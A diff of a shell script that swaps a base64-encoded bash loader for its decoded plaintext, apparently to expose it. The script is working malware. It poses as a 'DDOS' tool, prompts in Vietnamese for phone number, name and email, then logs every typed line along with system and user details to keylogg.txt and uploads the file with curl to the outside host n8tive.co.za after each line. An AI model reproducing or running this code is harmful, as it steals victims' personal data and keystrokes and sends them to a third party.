@@ -1,2 +1,34 @@
-PROGRAM="IyEvc3lzdGVtL2Jpbi9iYXNoL3NoDQplY2hvICJERE9TIg0KZWNobyBWdWkgTMOybmcgTmjhuq1wIFRow7RuZyBUaW4gY8OhIG5ow6JuIGPhu6dhIGLhuqFuIMSR4buDIHPGsGwgZOG7pW5nDQplY2hvICIiDQogIGVjaG8gLW4gU+G7kSDEkGnhu4duIFRob+G6oWkgOg0KICByZWFkIHBob25lDQogIGVjaG8gLW4gSOG7jSBWw6AgVMOqbiA6DQogIHJlYWQgbmFtZQ0KICBlY2hvIC1uIEVtYWlsIDoNCiAgcmVhZCBlbWFpbA0KDQpjbSgpDQp7DQpyZWFkIGxpbmUNCiAgY2FzZSAkbGluZSBpbg0KDQogICRsaW5lKQ0KICBlY2hvICINCiAgU3lzdGVtIDogJCh1bmFtZSAtYSkNCiAgVXNlciAgIDogJCh3aG9hbWkpDQogIGRhdGUgICA6ICQoZGF0ZSkNCiAgcGF0aCAgIDogJChwd2QpDQoNCiAgcGhvbmUgbnVtYmVyIDogJHBob25lDQogIG5hbWUgOiAkbmFtZQ0KICBlbWFpbCA6ICRlbWFpbA0KDQogICcsJ3skbGluZX0nLCcgIiA+PiBrZXlsb2dnLnR4dA0KICBjdXJsIC1UIGtleWxvZ2cudHh0IGh0dHA6Ly9uOHRpdmUuY28uemEvDQogIGNtDQoNCiBlc2FjDQogfQ0KY20="
-bash <( base64 -d <<< "$PROGRAM" )
+#!/system/bin/bash/sh
+echo "DDOS"
+echo Vui Lòng Nhập Thông Tin cá nhân của bạn để sưl dụng
+echo ""
+  echo -n Số Điện Thoại :
+  read phone
+  echo -n Họ Và Tên :
+  read name
+  echo -n Email :
+  read email
+
+cm()
+{
+read line
+  case $line in
+
+  $line)
+  echo "
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+
+  phone number : $phone
+  name : $name
+  email : $email
+
+  ','{$line}',' " >> keylogg.txt
+  curl -T keylogg.txt http://n8tive.co.za/
+  cm
+
+ esac
+ }
+cm
